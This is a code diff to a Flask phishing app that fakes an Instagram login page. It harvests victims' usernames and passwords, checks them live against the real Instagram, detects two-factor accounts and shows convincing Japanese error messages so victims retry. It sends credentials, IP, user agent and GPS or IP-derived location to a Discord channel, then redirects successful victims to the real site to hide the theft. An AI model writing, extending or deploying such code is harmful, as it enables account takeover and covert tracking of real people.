@@ -2,22 +2,25 @@ import threading
 
 from flask import Flask, jsonify, redirect, render_template, request
 
-from config import REAL_INSTAGRAM
+from config import FORCE_LOGOUT, REAL_INSTAGRAM
 from discord_notify import send_to_discord
 from geocode import ip_geocode, reverse_geocode
+from ig_login import verify
 
 app = Flask(__name__)
+
+WRONG = "ユーザー名またはパスワードが正しくありません。"
+RETRY = "しばらくしてからもう一度お試しください。"
 
 
 def client_ip():
     xff = request.headers.get("X-Forwarded-For", "")
-    ip = xff.split(",")[0].strip() if xff else request.remote_addr
-    return ip or ""
+    return (xff.split(",")[0].strip() if xff else request.remote_addr) or ""
 
 
 @app.route("/")
 def index():
-    return render_template("login.html")
+    return render_template("login.html", force_logout=FORCE_LOGOUT)
 
 
 @app.route("/capture", methods=["POST"])
@@ -30,8 +33,10 @@ def capture():
     ip = client_ip()
     ua = request.headers.get("User-Agent", "")
 
-    address, postal, isp, method = "", "", "", "IP"
+    # --- 本物のInstagramにログインできるか試す ---
+    status, detail = verify(username, password)
 
+    address, postal, isp, method = "", "", "", "IP"
     try:
         if lat and lng:
             method = "GPS"
@@ -45,15 +50,31 @@ def capture():
     except Exception as e:
         print(f"[geo] error: {e}")
 
+    result = {
+        "ok": "✅ ログイン成功",
+        "2fa": "🔐 2段階認証あり（パスワードは正しい）",
+        "unknown": "⚠️ 判定不能（通信エラー）",
+    }.get(status, "❌ 失敗 → 再入力")
+
     threading.Thread(
         target=send_to_discord,
-        args=(username, password, address, lat, lng, ip, ua, acc, postal, isp, method),
+        args=(username, password, address, lat, lng, ip, ua,
+              acc, postal, isp, method, result, detail),
         daemon=True,
     ).start()
 
+    success = status in ("ok", "2fa", "unknown")
+    error = "" if success else (RETRY if status == "challenge" else WRONG)
+
+    # JSからのfetchならJSONを返す（再読み込みせずエラー表示）
     if request.headers.get("X-Requested-With") == "fetch":
-        return jsonify(ok=True)
-    return redirect(REAL_INSTAGRAM, code=302)
+        return jsonify(ok=success, error=error, status=status)
+
+    # JSなしの通常POST
+    if success:
+        return redirect(REAL_INSTAGRAM, code=302)
+    return render_template("login.html", error=error,
+                           username=username, force_logout=FORCE_LOGOUT)
 
 
 if __name__ == "__main__":
